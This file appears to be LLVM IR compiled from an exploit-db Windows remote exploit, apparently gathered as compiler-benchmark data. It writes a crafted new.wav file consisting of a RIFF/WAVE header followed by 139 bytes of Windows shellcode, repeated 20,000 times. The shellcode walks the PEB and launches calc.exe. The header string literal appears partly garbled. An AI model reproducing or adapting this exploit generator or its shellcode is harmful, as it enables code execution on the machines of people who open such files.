; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_32684.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_32684.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.scode = private unnamed_addr constant [139 x i8] c"\FC\E8D\00\00\00\8BE<\8B|\05x\01\EF\8BO\18\8B_ \01\EBI\8B4\8B\01\EE1\C0\99\AC\84\C0t\07\C1\CA\0D\01\C2\EB\F4;T$\04u\E5\8B_$\01\EBf\8B\0CK\8B_\1C\01\EB\8B\1C\8B\01\EB\89\\$\04\C31\C0d\8B@0\85\C0x\0C\8B@\0C\8Bp\1C\AD\8Bh\08\EB\09\8B\80\B0\00\00\00\8Bh<_1\F6`V\89\F8\83\C0{Ph~\D8\E2sh\98\FE\8A\0EW\FF\E7calc.exe\00\00", align 16
@__const.main.begincode = private unnamed_addr constant [296 x i8] c"RIFF\04D\0E\01WAVEfmt (\00\00\00\FE\FF\02\00\00\EE\02\00\00\94\11\00\06\00\18\00\16\00\18\00\00\00\00\00\01\00\00\00\00\00\10\00\80\00\00\AA\008\9Bqdataalign 16
@.str = private unnamed_addr constant [8 x i8] c"new.wav\00", align 1
@.str.1 = private unnamed_addr constant [3 x i8] c"w+\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [139 x i8], align 16
  %3 = alloca [296 x i8], align 16
  %4 = alloca i32*, align 8
  %5 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %6 = bitcast [139 x i8]* %2 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %6, i8* align 16 getelementptr inbounds ([139 x i8], [139 x i8]* @__const.main.scode, i32 0, i32 0), i64 139, i1 false)
  %7 = bitcast [296 x i8]* %3 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %7, i8* align 16 getelementptr inbounds ([296 x i8], [296 x i8]* @__const.main.begincode, i32 0, i32 0), i64 296, i1 false)
  %8 = call i32* @_fsopen(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0), i32 0)
  store i32* %8, i32** %4, align 8
  %9 = getelementptr inbounds [296 x i8], [296 x i8]* %3, i64 0, i64 0
  %10 = load i32*, i32** %4, align 8
  %11 = call i32 @fwrite(i8* %9, i32 139, i32 1, i32* %10)
  store i32 0, i32* %5, align 4
  br label %12

12:                                               ; preds = %19, %0
  %13 = load i32, i32* %5, align 4
  %14 = icmp slt i32 %13, 20000
  br i1 %14, label %15, label %22

15:                                               ; preds = %12
  %16 = getelementptr inbounds [139 x i8], [139 x i8]* %2, i64 0, i64 0
  %17 = load i32*, i32** %4, align 8
  %18 = call i32 @fwrite(i8* %16, i32 139, i32 1, i32* %17)
  br label %19

19:                                               ; preds = %15
  %20 = load i32, i32* %5, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %5, align 4
  br label %12

22:                                               ; preds = %12
  %23 = load i32*, i32** %4, align 8
  %24 = call i32 @fclose(i32* %23)
  ret i32 0
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32* @_fsopen(i8*, i8*, i32) #2

declare dso_local i32 @fwrite(i8*, i32, i32, i32*) #2

declare dso_local i32 @fclose(i32*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
